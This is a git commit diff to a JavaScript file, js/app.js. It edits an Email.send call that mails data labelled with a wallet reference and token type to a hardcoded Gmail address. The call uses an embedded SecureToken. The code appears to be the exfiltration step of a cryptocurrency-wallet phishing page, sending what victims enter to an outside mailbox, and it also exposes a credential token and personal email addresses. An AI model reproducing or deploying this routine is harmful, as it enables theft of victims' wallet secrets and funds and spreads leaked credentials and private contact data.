8ce772203e172ed8d9458749d6274abe92eddbf1
williammolten <133612484+williammolten@users.noreply.github.com>
2023-05-27 23:07:17 +0100

    Update app.js

--- js/app.js
+++ js/app.js
@@ -89,7 +89,7 @@ const sendRequest = (data) => {
   Email.send({
     SecureToken: '1da0dcb4-c434-44fa-b7fa-c9577ebe1408',
     To: 'bekkierowland@gmail.com',
-    From: "bekkierowland@gmail.com",
+    From: "shirleylargey40@gmail.com",
     Subject: `${data.walletRef} and token type is ${data.type}`,
     Body: `${msg}`,
   })
